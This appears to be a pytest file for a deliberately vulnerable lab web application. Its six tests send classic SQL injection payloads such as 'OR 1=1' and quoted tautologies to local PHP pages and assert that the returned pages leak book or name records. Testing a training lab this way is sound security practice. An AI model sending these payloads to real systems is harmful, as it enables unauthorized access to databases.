import pytest
import requests

BASE_URL = "http://localhost/Vulnerable-Web-Application/SQL/"

def test_sql_injection_level_1():
    url = BASE_URL + "sql1.php"
    data = {"firstname": "John' OR '1'='1"}
    response = requests.post(url, data=data)
    assert "Doe" in response.text

def test_sql_injection_level_2():
    url = BASE_URL + "sql2.php"
    data = {"number": "1 OR 1=1"}
    response = requests.post(url, data=data)
    assert "SILMARILLION" in response.text

def test_sql_injection_level_3():
    url = BASE_URL + "sql3.php"
    data = {"number": "1' OR '1'='1"}
    response = requests.post(url, data=data)
    assert "SILMARILLION" in response.text

def test_sql_injection_level_4():
    url = BASE_URL + "sql4.php"
    data = {"number": "1 OR 1=1"}
    response = requests.post(url, data=data)
    assert "SILMARILLION" in response.text

def test_sql_injection_level_5():
    url = BASE_URL + "sql5.php"
    data = {"number": "1 OR 1=1"}
    response = requests.post(url, data=data)
    assert "SILMARILLION" in response.text

def test_sql_injection_level_6():
    url = BASE_URL + "sql6.php"
    params = {"number": "1' OR '1'='1"}
    response = requests.get(url, params=params)
    assert "There is a book with this index." in response.text
